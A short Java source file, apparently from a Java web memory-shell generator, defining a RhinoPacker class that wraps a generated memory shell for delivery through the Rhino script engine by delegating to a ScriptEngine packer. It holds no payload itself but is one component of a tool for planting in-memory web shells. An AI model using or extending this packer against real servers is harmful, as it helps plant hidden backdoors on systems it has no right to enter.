package com.reajason.javaweb.memshell.packer.rhino;

import com.reajason.javaweb.memshell.Packers;
import com.reajason.javaweb.memshell.config.GenerateResult;
import com.reajason.javaweb.memshell.packer.Packer;

/**
 * @author ReaJason
 * @since 2025/1/30
 */
public class RhinoPacker implements Packer {

    @Override
    public String pack(GenerateResult generateResult) {
        return Packers.ScriptEngine.getInstance().pack(generateResult);
    }
}
